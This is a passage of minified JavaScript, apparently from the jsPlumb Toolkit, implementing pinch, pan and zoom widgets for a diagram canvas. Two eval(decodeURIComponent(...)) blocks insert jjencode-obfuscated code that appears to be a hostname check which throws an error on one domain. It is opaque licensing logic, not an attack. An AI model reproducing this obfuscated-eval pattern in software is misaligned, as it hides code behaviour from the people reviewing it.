w._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){this.PinchListener=function(n){var t="onpointerdown"in document.documentElement,e="ontouchstart"in document.documentElement,o=[0,0],i=0,r=0,d=function(t){n[t](o,r,i,i/r)},_=function(){n.onPinchEnd()},s="onPinchStart",a="onPinch",w="touchmove",l="touchend",u=function(n,t,e,o){return Math.sqrt(Math.pow(e-n,2)+Math.pow(o-t,2))},c=function(){var t={},e=[],w=0,l=!1,c=function(){2===w&&(o=[(e[1].p[0]+e[0].p[0])/2,(e[1].p[1]+e[0].p[1])/2],i=u(e[1].p[0],e[1].p[1],e[0].p[0],e[0].p[1]))};n.bind(n.el,"pointerdown",function(n){w>=2||l||(e[w]={e:n,p:[n.pageX,n.pageY]},t[""+n.pointerId]=w,w++,c(),2===w&&(r=i,d(s)))}),n.bind(document,"pointerup",function(n){null!=t[""+n.pointerId]&&(delete t[""+n.pointerId],l=0!=--w,_())}),n.bind(document,"pointermove",function(n){if(!l&&2===w){var o=t[n.pointerId];null!=o&&(e[o].p=[n.pageX,n.pageY],c(),d(a))}})},B=function(n){var t=function(n){return n.touches||[]},e=function(n,t){return n.item?n.item(t):n[t]},c=function(n){var t=e(n,0),o=e(n,1);return u(t.pageX,t.pageY,o.pageX,o.pageY)},B=function(n){var t=e(n,0),o=e(n,1);return[(t.pageX+o.pageX)/2,(t.pageY+o.pageY)/2]},h=!1,j=function t(e){h=!1,n.unbind(document,w,p),n.unbind(document,l,t),_()},p=function(n){if(h){var e=t(n);2===e.length&&(i=c(e),o=B(e),d(a))}};n.bind(n.el,"touchstart",function(e){var _=t(e);2===_.length&&!1!==n.enableWheelZoom&&(o=B(_),i=r=c(_),h=!0,n.bind(document,w,p),n.bind(document,l,j),d(s))})};t?c(n):e&&B(n)}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumb;this.ZoomWidget=function(e){function r(n,t){if(function(){for(var n in dn)return!1;return!0}())return{w:0,h:0,x:0,y:0,vw:e.width(p),vh:e.height(p),padding:n,z:1,zoom:1};n=n||0,t=t||.9;var o=Math.abs(rn.maxx[0][0][0]+rn.maxx[0][1]-rn.minx[0][0][0]),i=Math.abs(rn.maxy[0][0][1]+rn.maxy[0][2]-rn.miny[0][0][1]),r=e.width(p),d=e.height(p),_=r/((o+2*n)/t),s=d/((i+2*n)/t),a=Math.min(_,s);return{w:o,h:i,x:rn.minx[0][0][0],y:rn.miny[0][0][1],vw:r,vh:d,padding:n,z:a,zoom:J}}function d(n){for(var t in rn)if(rn.hasOwnProperty(t)){for(var e=-1,o=0;o<rn[t].length;o++)if(rn[t][o][3]===n){e=o;break}-1!==e&&rn[t].splice(e,1)}}e.events=e.events||{};var _,s,a,w,l=this,u=function(){},c=e.canvas,B=e.domElement||function(n){return n},h=B(c),j=e.viewport,p=B(j),f=e.events.zoom||u,g=(e.events.maybeZoom,e.events.pan||u),m=e.events.mousedown||u,v=e.events.mouseup||u,C=e.events.mousemove||u,b=e.events.transformOrigin||u,y=!(!1===e.clamp),D=!1!==e.clampZoom,P=e.panDistance||50,E=!1!==e.enablePan,x=!1!==e.enableWheelZoom,A=!1!==e.enableAnimation,S=e.wheelFilter||function(){return!0},I=!0===e.wheelZoomMetaKey,k=(!0===e.wheelReverse?-1:1)*(e.wheelSensitivity||10),T=!0===e.wheelPan,M=!1!==e.enablePanButtons,N=e.padding||[0,0],O=!1!==e.consumeRightClick,F=e.smartMinimumZoom,L=!1,R="mousedown",G="mouseup",U="mousemove",z=["webkit","Moz","ms"],V=e.bind,H=e.unbind,W=!(!1===e.enabled),X=e.clampToBackground,Y=e.clampToBackgroundExtents,Z=e.filter||function(n){return!1},q=e.width,$=e.height,J=e.zoom||1,K=[0,0],Q=!1,nn=!1,tn=!1,en=!1,on=e.zoomRange||[.05,3],rn={minx:[],maxx:[],miny:[],maxy:[]},dn={},_n={},sn={},an=!1,wn=function(){rn.minx.sort(function(n,t){return n[0][0]<t[0][0]?-1:1}),rn.miny.sort(function(n,t){return n[0][1]<t[0][1]?-1:1}),rn.maxx.sort(function(n,t){return n[0][0]+n[1]>t[0][0]+t[1]?-1:1}),rn.maxy.sort(function(n,t){return n[0][1]+n[2]>t[0][1]+t[2]?-1:1})},ln=function(n,t,e,o){null==dn[n]&&(dn[n]=[],rn.minx.push(dn[n]),rn.miny.push(dn[n]),rn.maxx.push(dn[n]),rn.maxy.push(dn[n])),dn[n][0]=t,dn[n][1]=e,dn[n][2]=o,dn[n][3]=n,L?an=!0:wn()};this.setBoundsFor=ln,this.setSuspendRendering=function(n){L=n,!n&&an&&wn(),an=!1};var un=null,cn=null,Bn=null,hn=function(){window.clearTimeout(un),Bn&&e.removeClass(Bn,"jtk-surface-pan-active"),Bn=null},jn=function(n,t){return function(e){var o=Mn(h,10*n,10*t,null);g(o[0],o[1],J,J,e),_&&_.pan(),Yn.pan()}},pn=function(){window.clearTimeout(cn)},fn=function(n,t,o,i,r){var d=document.createElement("div");for(var s in d.innerHTML=r||"",d.style.position="absolute",t)d.style[s]=t[s];return d.className="jtk-surface-pan jtk-surface-pan-"+n,p.appendChild(d),e.bind(d,"click",function(n,t){return function(e){Mn(h,n*P,t*P,null,!0,function(n){g(n[0],n[1],J,J,e),_&&_.pan(),Yn.pan()})}}(o,i)),e.bind(d,"mousedown",function(n,t,o){return function(){Bn=o,e.addClass(Bn,"jtk-surface-pan-active"),e.bind(document,"mouseup",hn),un=window.setTimeout(function(){e.bind(document,G,pn),cn=window.setInterval(jn(n,t),60)},150)}}(o,i,d)),d};M&&(fn("top",{left:"0px",top:"0px"},0,-1,"&#8593;"),fn("bottom",{left:"0px",bottom:"0px"},0,1,"&#8595;"),fn("left",{left:"0px",top:"0px"},-1,0,"&#8592;"),fn("right",{right:"0px",top:"0px"},1,0,"&#8594;"));var gn=function(n,t,e){e=e||h;for(var o=0;o<z.length;o++){var i=n.replace(/([a-z]){1}/,function(n){return z[o]+n.toUpperCase()});e.style[i]=t}e.style[n]=t},mn=function(n){gn("transformOrigin",K[0]+"% "+K[1]+"%",n)},vn=function(n,t){var o=l.mapLocation(n,t),i=[o.left,o.top],r=e.width(c),d=e.height(c);return{w:r,h:d,xy:i,xScale:i[0]/r,yScale:i[1]/d,o:[i[0]/r*100,i[1]/d*100]}},Cn=function(n,t,e,o){var i,r,d=K[0]/100*t,_=K[1]/100*e;i=-d*(1-J),r=-_*(1-J),K=n,mn(),d=K[0]/100*t,_=K[1]/100*e;var s=Mn(h,-d*(1-J)-i,-_*(1-J)-r,o);b&&b(K,s)},bn=function(n,t,e){var o=vn(n,t);Cn(o.o,o.w,o.h,e)},yn=function(n){var t=Pn(n);bn(t[0],t[1],n)},Dn=function(n,t){var o=e.width(c),i=e.height(c);Cn([n/o*100,t/i*100],o,i)},Pn=this.pageLocation=function(n){if(null!=n.pageX)return[n.pageX,n.pageY];var t=En(xn(n),0);return t?[t.pageX,t.pageY]:[0,0]},En=function(n,t){return n.item?n.item(t):n[t]},xn=function(n){return n.touches||[]},An=function n(t,e,o,i,d){if(!(null==t||isNaN(t)||t<0)){var s=on[0];if(F){s=.5;var a=r().z;t/a<s&&(t=a*s)}else t<s&&(t=s);if(t>on[1]&&(t=on[1]),i){var w=t>J?.05:-.05,l=J,u=t<J,c=window.setInterval(function(){l=n(l+w),u&&l<=t&&window.clearInterval(c),!u&&l>=t&&window.clearInterval(c)});return J}gn("transform","scale("+t+")");var B=J;if(J=t,d||f(0,0,J,B,e,o),null!=_&&_.setZoom(t),Yn&&Yn.pan(),D){var j=Tn(h),p=kn(j[0],j[1]);p[0]==j[0]&&p[1]==j[1]||Tn(h,p[0],p[1],null,!i)}return J}},Sn=function(n,t,e,o){t<-150&&(t=-150),t>150&&(t=150),In(a,t,-150,150,e,o)},In=function(n,t,e,o,i,r){var d=n+t/(t>=0?o:e)*(on[t>=0?1:0]-n);An(d,i,r)},kn=function(n,t,o){if(y||X||Y){var i=Nn(),d=n,s=t,a=y?r():{x:0,y:0,w:0,h:0,vw:e.width(p),vh:e.height(p),padding:o,z:1};if(o=(o||20)*J,(X||Y)&&null!=_){var w=_.getWidth(),l=_.getHeight(),u=Math.max(a.x+a.w,w),c=Math.max(a.y+a.h,l);a.w=u-a.w,a.h=c-a.h;var B=a.vw/a.w,h=a.vh/a.h;a.z=Math.min(B,h),Y&&(o=Math.max(a.vw,a.vh))}var j=[a.x+a.w,a.y+a.h];_&&(j[0]=Math.max(j[0],_.getWidth()),j[1]=Math.max(j[1],_.getHeight()));var f=n+i[0]+j[0]*J-o,g=t+i[1]+j[1]*J-o,m=n+i[0]+a.x*J+o,v=t+i[1]+a.y*J+o;return f<0&&(d-=f),m>a.vw&&(d-=m-a.vw),g<0&&(s-=g),v>a.vh&&(s-=v-a.vh),[d,s]}return[n,t]},Tn=function(n,t,o,i,r,d,_){if(1==arguments.length)return[parseInt(n.style.left,10)||0,parseInt(n.style.top,10)||0];var s=kn(t,o);return A&&!r&&e.animate?e.animate(n,{left:s[0],top:s[1]},{step:_,complete:function(){d&&d(s)}}):(n.style.left=s[0]+"px",n.style.top=s[1]+"px",d&&d(s)),s};h.style.left="0px",h.style.top="0px";var Mn=function(n,t,e,o,i,r){var d=Tn(n);return Tn(n,d[0]+t,d[1]+e,o,!i,r)},Nn=function(){var n=e.width(c),t=e.height(c),o=K[0]/100*n,i=K[1]/100*t;return[o*(1-J),i*(1-J)]},On={start:function(n,t){if(!nn){var o=n.srcElement||n.target;W&&(o===h||o===p||o._jtkDecoration||_&&_.owns(o)||!0===Z(o,n))&&(en=!1,-1,-1,3!==n.which||!1===e.enableWheelZoom||null!=n.mozInputSource&&1!==n.mozInputSource?t.length<=1&&(Q=!0,s=Pn(n),w=Tn(h)):(tn=!0,s=Pn(n),yn(n),w=Tn(h),a=J)),m(n,l)}},move:function(n,t){var e,o,i;if(en=!1,!nn){if(tn)e=(i=Pn(n))[0]-s[0],o=i[1]-s[1],Sn(0,o,n);else if(Q&&E&&null!=s){e=(i=Pn(n))[0]-s[0],o=i[1]-s[1];var r=Tn(h,w[0]+e,w[1]+o,n,!0);g(r[0],r[1],J,J,n),_&&_.pan(),Yn&&Yn.pan()}C(n,l)}},end:function(n,t){nn||(tn=!1,s=null,Q=!1,en=!1,H(document,U,Ln),H(document,G,Rn),V(document,U,Gn),v(n,l))},contextmenu:function(n){}},Fn=function(n,t){"contextmenu"===n&&O&&t.preventDefault&&t.preventDefault();var e=xn(t);On[n](t,e)},Ln=function(n){Fn("move",n)},Rn=function(n){Fn("end",n)},Gn=function(n){en=!1};V(document,U,Gn);var Un=this.start=function(n){W&&null!=n&&(H(document,U,Gn),V(document,U,Ln),V(document,G,Rn),On.start(n,xn(n)))};if(V(j,R,Un),V(j,"contextmenu",function(n){Fn("contextmenu",n)}),x){addWheelListener(p,function(n,t,e,o){S(n)&&(n.preventDefault&&n.preventDefault(),n.stopPropagation&&n.stopPropagation(),!T||o?function(n,t,e){a=J,en||(yn(n),en=!0),Sn(0,n.normalizedWheelDelta*k,n,!0)}(n):function(n,t,e,o){o||zn(100*-t,100*-e)}(0,t,e,o))},!0,I)}new PinchListener({el:j,bind:V,unbind:H,enableWheelZoom:e.enableWheelZoom,onPinch:function(n,t,e,o){An(o*a);var i=n[0]-s[0],r=n[1]-s[1];Tn(h,w[0]+i,w[1]+r,null,!0)},onPinchStart:function(n,t){nn=!0,t,a=J,bn((s=n)[0],s[1]),w=Tn(h)},onPinchEnd:function(){nn=!1,s=null}}),An(J,null,!1,!1,!0),mn(),this.isPinchZooming=function(){return nn},this.positionChanged=function(n,t,o){o=o||e.id(n);var i=t||Tn(n),r=e.width(n),d=e.height(n);_n[o]=n,ln(o,i,r,d)},this.add=function(n,t,e,o){this.positionChanged(n,e,t),o&&(V(n,R,Un),n._jtkDecoration=!0)},this.suspend=function(n){var t="string"==typeof n?n:e.id(n);sn[t]=!0,d(t)},this.isSuspended=function(n){var t="string"==typeof n?n:e.id(n);return!0===sn[t]},this.restore=function(n){var t="string"==typeof n?n:e.id(n);delete sn[t],this.positionChanged(n,null,t)},this.remove=function(n){n=B(n);var t=e.id(n);delete dn[t],delete _n[t],delete sn[t],d(t)},this.reset=function(){rn.minx.length=0,rn.miny.length=0,rn.maxx.length=0,rn.maxy.length=0,dn={},_n={},sn={},Tn(h,0,0,null,!0)},this.getBoundsInfo=r,this.zoomToFit=function(n){var t=r((n=n||{}).padding,n.fill);n.doNotZoomIfVisible&&t.z>J||An(t.z),l.centerContent({bounds:t,doNotAnimate:!1!==n.doNotAnimate,onComplete:n.onComplete,onStep:n.onStep,doNotFirePanEvent:n.doNotFirePanEvent})},this.zoomToFitIfNecessary=function(t){var e=n.extend(t||{});e.doNotZoomIfVisible=!0,this.zoomToFit(e)},this.zoomToElements=function(n){for(var t={x:1/0,y:1/0,xMax:-1/0,yMax:-1/0,z:1,vw:e.width(p),vh:e.height(p)},o=0;o<n.elements.length;o++){var i=n.elements[o],r=e.offset(i),d=e.width(i),_=e.height(i);t.x=Math.min(t.x,r.left),t.y=Math.min(t.y,r.top),t.xMax=Math.max(t.xMax,r.left+d),t.yMax=Math.max(t.yMax,r.top+_)}var s=e.fill||.9;t.w=s*(t.xMax-t.x),t.h=s*(t.yMax-t.y),t.z=Math.min(t.vw/t.w,t.vh/t.h),n.doNotZoomIfVisible&&t.z>J||An(t.z),l.centerContent({bounds:t,doNotAnimate:!1!==n.doNotAnimate,onComplete:n.onComplete,onStep:n.onStep,doNotFirePanEvent:n.doNotFirePanEvent})},this.zoomToBackground=function(n){if(n=n||{},null!=_){var t=_.getWidth(),e=_.getHeight(),o=q(p),i=$(p),r=o/t,d=i/e,s={w:t,h:e,x:0,y:0,vw:o,vh:i,padding:0,z:Math.min(r,d)};An(s.z),l.centerContent({bounds:s,doNotAnimate:n.doNotAnimate,onComplete:n.onComplete,onStep:n.onStep})}},this.setFilter=function(n){Z=n||function(n){return!1}},this.centerBackground=function(){if(null!=_){var t=n.extend({},r());t.x=_.getWidth()/2,t.y=_.getHeight()/2,t.w=1,t.h=1,l.centerContent({bounds:t,doNotAnimate:e.doNotAnimate,onComplete:e.onComplete,onStep:e.onStep,vertical:!0,horizontal:!0})}},this.alignBackground=function(n){if(null!=_){var t=n.split(" "),e=t[0]||"left",o=t[1]||"top",i=r(),d="left"===e?0:i.vw-_.getWidth()*J,s="top"===o?0:i.vh-_.getHeight()*J,a=Nn();Tn(h,d-a[0],s-a[1]),_.pan(),Yn&&Yn.pan()}},this.positionElementAt=function(n,t,o,i,r,d){i=i||0,r=r||0;var _=Nn(),s=Tn(h),a=B(n),w=a.parentNode,l=e.offset(w),u=e.offset(j),c=u.left-l.left+(s[0]+_[0])+t*J+i,p=u.top-l.top+(s[1]+_[1])+o*J+r;d&&c<0&&(c=0),d&&p<0&&(p=0),a.style.left=c+"px",a.style.top=p+"px"},this.positionElementAtPageLocation=function(n,t,e,o,i){var r=this.mapLocation(t,e);this.positionElementAt(n,r.left,r.top,o,i)},this.positionElementAtEventLocation=function(n,t,e,o){var i=this.mapEventLocation(t);this.positionElementAt(n,i.left,i.top,e,o)},this.zoomToEvent=function(n,t){yn(n),An(J+t,n)},this.relayout=function(n,t){if(!1===e.enablePan){Tn(h,-n.x+N[0],-n.y+N[1],null,t);var o=n.w+(n.x<0?n.x:0)+N[0],i=n.h+(n.y<0?n.y:0)+N[1];h.style.width=o+"px",h.style.height=i+"px";var r=0===o?0:(n.x-N[0])/o*100,d=0===i?0:(n.y-N[1])/i*100;this.setTransformOrigin(r,d)}},this.nudgeZoom=function(n,t){var o=e.offset(p,!0),i=o.left+e.width(p)/2,r=o.top+e.height(p)/2;return bn(i,r),An(J+n,t)},this.nudgeWheelZoom=function(n,t){a=J,Sn(0,n,t,!0)},this.centerContent=function(n){var t=(n=n||{}).bounds||r(),e=Nn(),o=t.x*J+t.w*J/2,i=t.y*J+t.h*J/2,d=t.vw/2-o,s=t.vh/2-i,a=Tn(h);Tn(h,!1!==n.horizontal?d-e[0]:a[0],!1!==n.vertical?s-e[1]:a[1],null,n.doNotAnimate,function(){n.doNotFirePanEvent||g(!1!==n.horizontal?d-a[0]:0,!1!==n.vertical?s-a[1]:0,J,J),_&&_.pan(),Yn&&Yn.pan(),n.onComplete&&n.onComplete()},n.onStep)},this.centerContentHorizontally=function(t){this.centerContent(n.extend({horizontal:!0,vertical:!1},t))},this.centerContentVertically=function(t){this.centerContent(n.extend({vertical:!0,horizontal:!1},t))},this.centerOn=function(t,e){e=e||{};var o=n.extend({},r()),i=Tn(t),d=q(t),_=$(t);o.x=i[0],o.y=i[1],o.w=d,o.h=_;this.centerContent({bounds:o,doNotAnimate:e.doNotAnimate,onComplete:function(){Dn(i[0]+d/2,i[1]+_/2),e.onComplete&&e.onComplete()},onStep:e.onStep,vertical:!1!==e.vertical,horizontal:!1!==e.horizontal})},this.centerOnHorizontally=function(n){this.centerOn(n,{vertical:!1})},this.centerOnVertically=function(n){this.centerOn(n,{horizontal:!1})},this.centerOnAndZoom=function(n,t){t=t||.6;var e={w:q(n),h:$(n)},o=Tn(n),i=r(),d=i.vw<i.vh?[i.vw,"w"]:[i.vh,"h"],_=t*d[0]/e[d[1]];_<on[0]&&(_=on[0]),_>on[1]&&(_=on[1]);var s=J,a=_-J;Dn(o[0]+e.w/2,o[1]+e.h/2),this.centerOn(n,{onStep:function(n,t){An(s+n/t*a)},onComplete:function(){An(_)}})},this.getViewportCenter=function(){var t=n.extend({},r()),e=Nn(),o=Tn(h),i=[t.vw/2,t.vh/2];return[(i[0]-(o[0]+e[0]))/J,(i[1]-(o[1]+e[1]))/J]},this.setViewportCenter=function(t){var e=n.extend({},r()),o=Nn(),i=[e.vw/2,e.vh/2],d=[-(t[0]*J-i[0]+o[0]),-(t[1]*J-i[1]+o[1])];Tn(h,d[0],d[1])},this.setClamping=function(n){y=n},this.setZoom=function(n,t,e){return An(n,null,null,t,e)},this.setZoomRange=function(n,t){return null!=n&&2===n.length&&n[0]<n[1]&&null!=n[0]&&null!=n[1]&&n[0]>0&&n[1]>0&&(on=n,t||(J<on[0]||J>on[1])&&An(J)),on},this.getZoomRange=function(){return on},this.getZoom=function(){return J},this.getPan=function(){return Tn(h)};var zn=this.pan=function(n,t,e){Mn(h,n,t,null,e,function(n){g(n[0],n[1],J,J),_&&_.pan(),Yn&&Yn.pan()})};this.setPan=function(n,t,e,o,i){return Tn(h,n,t,null,!e,o,i)},this.setTransformOrigin=function(n,t){K=[n,t],mn()};var Vn=this.calculateCumulativeScroll=function(n){for(var t=n,e=0,o=0;null!=t&&t!==document.body;)isNaN(t.scrollLeft)||(e+=t.scrollLeft),isNaN(t.scrollTop)||(o+=t.scrollTop),t=t.parentNode;return{left:e,top:o}},Hn=this.calculateOffset=function(n){for(var t=n,e=0,o=0;null!=t&&t!==document.body;)e+=t.offsetLeft,o+=t.offsetTop,t=t.offsetParent;return{left:e,top:o}};this.mapLocation=function(n,t,e){var o=Nn(),i=Tn(h),r=Vn(p),d=e?{left:0,top:0}:Hn(p);return{left:(n-(i[0]+o[0])-d.left+r.left)/J,top:(t-(i[1]+o[1])-d.top+r.top)/J}},this.mapEventLocation=function(n,t){var e=Pn(n);return this.mapLocation(e[0],e[1],t)},this.setEnabled=function(n){W=n},this.showElementAt=function(n,t,o){var i=B(n).parentNode,r=e.offset(i),d=e.offset(j),_=Nn(),s=r.left-d.left+_[0]+t,a=r.top-d.top+_[1]+o;e.offset(n,{left:s,top:a})},this.getApparentCanvasLocation=function(){var n=Nn(),t=Tn(h);return[t[0]+n[0],t[1]+n[1]]},this.setApparentCanvasLocation=function(n,t){var e=Nn(),o=Tn(h,n-e[0],t-e[1],null,!0);return _&&_.pan(),Yn&&Yn.pan(),o},this.applyZoomToElement=function(n,t){gn("transform","scale("+(t=t||J)+")",n)},this.setTransformOriginForElement=function(n,t){gn("transformOrigin",t[0]+" 